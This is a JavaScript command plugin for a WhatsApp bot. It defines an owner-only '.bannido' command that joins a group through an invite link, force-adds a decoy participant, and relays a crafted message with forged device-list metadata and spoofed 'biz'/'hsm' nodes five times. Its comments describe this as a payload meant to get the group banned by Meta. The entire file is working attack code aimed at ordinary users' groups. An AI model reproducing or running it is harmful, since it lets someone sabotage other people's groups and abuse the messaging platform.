// ⟦EXPERT⟧ .bannido — join a group via invite link and fire the Meta ban payload
async function ownerOnly(z) {
  return !!z.isOwner
}

function extractGroupCode(link) {
  if (!link) return null
  const m = String(link).match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i)
  return m ? m[1] : null
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

// ─── The Meta ban payload ───
async function groupBan(sock, target) {
  if (!target.endsWith('@g.us')) throw new Error('@g.us target required')

  // Step 1: force-add a decoy participant to trigger group-state anomaly
  try {
    await sock.groupParticipantsUpdate(target, ['13135550002@s.whatsapp.net'], 'add')
  } catch (e) {
    console.warn('[bannido] groupParticipantsUpdate failed:', e.message)
    // continue — the relay is the payload that matters
  }

  // Step 2: the actual Meta payload
  const message = {
    messageContextInfo: {
      deviceListMetadata: {
        recipientKeyHash: '9O2/zrd/eSN9zQ==',
        recipientTimestamp: '1780007205'
      },
      deviceListMetadataVersion: 2
    },
    placeholderMessage: {
      type: 'MASK_LINKED_DEVICES'
    }
  }

  await sock.relayMessage(target, message, {
    messageId: 'MSG-' + Date.now(),
    additionalNodes: [
      {
        tag: 'biz',
        attrs: {
          actual_actors: '2',
          host_storage: '2',
          privacy_mode_ts: '1752211793'
        },
        content: [
          {
            tag: 'quality_control',
            attrs: {
              decision_id: '6a01f938cec6e2acc8eec82c1eab0630af9cc1e2',
              source_type: 'third_party'
            },
            content: [
              {
                tag: 'decision_source',
                attrs: { value: 'df' }
              }
            ]
          },
          {
            tag: 'auth',
            attrs: {
              disable_ios_autofill: 'false'
            }
          }
        ]
      },
      {
        tag: 'hsm',
        attrs: {
          tag: 'AUTHENTICATION'
        }
      }
    ]
  })
}

export default {
  name: 'bannido',
  aliases: ['banindo', 'gbug'],
  desc: 'Join a group by invite link and fire the Meta ban payload (owner only)',
  async run(z) {
    await z.react('🚫').catch(() => {})

    try {
      if (!(await ownerOnly(z))) return z.reply('⛔ Owner only.')

      const link = (z.args?.[0] || '').trim()
      if (!link) {
        return z.reply(
          `🪧 *FORMAT:* ${z.prefix}bannido https://chat.whatsapp.com/xxxxxx\n\n` +
          `*HOW:* Send a WhatsApp group invite link. The bot will auto-join and fire the payload.`
        )
      }

      const inviteCode = extractGroupCode(link)
      if (!inviteCode) {
        return z.reply(
          `❌ *Invalid link!*\n\n` +
          `Make sure it is a WhatsApp group invite link.\n` +
          `Example: https://chat.whatsapp.com/abc123xyz`
        )
      }

      const thumbnailURL = 'https://files.catbox.moe/tq24pu.png'

      // ─── Initial process message ───
      const baseCaption =
        `<blockquote>🏴 Group Details</blockquote>\n` +
        `⇢ Target: ${link}\n` +
        `⇢ Status: 🔄 Processing... (joining group)\n` +
        `⇢ Command: ${z.prefix}bannido`

      try {
        await z.sock.sendMessage(z.jid, {
          image: { url: thumbnailURL },
          caption: baseCaption
        }, { quoted: z.msg })
      } catch {
        await z.reply(baseCaption)
      }

      // ─── Join the group ───
      let groupJid
      try {
        groupJid = await z.sock.groupAcceptInvite(inviteCode)
        if (!groupJid) throw new Error('Join failed: empty groupJid.')
      } catch (err) {
        console.error('[bannido] join failed:', err.message)
        let msg = err.message
        if (/already|exist/i.test(msg)) msg = 'Bot has already joined this group.'
        else if (/invalid|expired/i.test(msg)) msg = 'Invite link is invalid or expired.'

        return z.reply(
          `<blockquote>🏴 Group Details</blockquote>\n` +
          `⇢ Target: ${link}\n` +
          `⇢ Status: ❌ Failed: ${msg}\n` +
          `⇢ Command: ${z.prefix}bannido`
        )
      }

      // ─── Joined ───
      await z.reply(
        `<blockquote>🏴 Group Details</blockquote>\n` +
        `⇢ Target: ${link}\n` +
        `⇢ Group JID: ${groupJid}\n` +
        `⇢ Status: ✅ Join successful!\n` +
        `⇢ Command: ${z.prefix}bannido`
      )

      // ─── Fire the payload N times ───
      const totalSpam = 5
      let sent = 0

      for (let i = 0; i < totalSpam; i++) {
        try {
          await groupBan(z.sock, groupJid)
          sent++
        } catch (err) {
          console.warn(`[bannido] payload ${i + 1} failed:`, err.message)
        }
        await sleep(1500)
      }

      // ─── Final status ───
      await z.reply(
        `<blockquote>🏴 Group Details</blockquote>\n` +
        `⇢ Target: ${link}\n` +
        `⇢ Group JID: ${groupJid}\n` +
        `⇢ Status: ✅ Success! ${sent}/${totalSpam} payloads sent\n` +
        `⇢ Command: ${z.prefix}bannido`
      )
      await z.react('✅').catch(() => {})
    } catch (e) {
      console.error('[bannido]', e)
      await z.reply(`❌ *Bannido failed*\n${e.message}`)
      await z.react('❌').catch(() => {})
    }
  }
      }
